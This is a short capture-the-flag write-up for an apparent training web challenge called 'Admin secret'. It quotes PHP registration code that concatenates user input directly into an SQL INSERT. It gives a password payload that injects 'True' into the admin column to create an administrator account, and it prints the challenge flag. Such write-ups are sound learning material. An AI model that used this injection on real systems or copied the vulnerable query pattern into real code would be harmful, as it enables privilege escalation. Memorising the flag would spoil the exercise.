## Challenge Name: Admin secret
**Category:** Web

**Challenge Description:**

I found this site where you can register, but only the administrator receives the most interesting information. Can you sneak in?

Website: http://adminsecret.challs.olicyber.it

### Approach

This challenge gives you the source code of the ```registration.php``` and of the ```login.php```.
While in the second one i found no vulnerabilities, inside the ```registration.php``` i found this piece of code that can be exploited: 

```php
<?php
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
            $db = new mysqli($db_host, $db_user, $db_password, $db_schema);

            $username = $_POST['username'];
            $password = $_POST['password'];

            $sql = "INSERT INTO users(username,password,admin) VALUES ('" . $username . "','" . $password . "',false);";

            if ($db->query($sql) === TRUE) {
                echo '<div class="alert alert-success" role="alert">Ti sei registrato! Puoi ora fare login</div>';
            } else {
                echo '<div class="alert alert-danger" role="alert">Error: ' . $sql . "<br>" . $db->error . "</div>";
            }
            $db->close();
        }
        ?>
```
By looking at this code snippet i found an SQL injection vulnerability inside this challenge, so to solve this challenge we have to register a new user with admin privileges with: 

```
username: XXX
password: XXX', True) --
```
Login with this user gives us the flag

**Flag**

```
flag{c0me_se1_div3ntato_admin}
```
### Reflections
Easy sql injection challenge 
  

---
<a href="/olicyber-training/main.md" class="btn">Back to home</a>
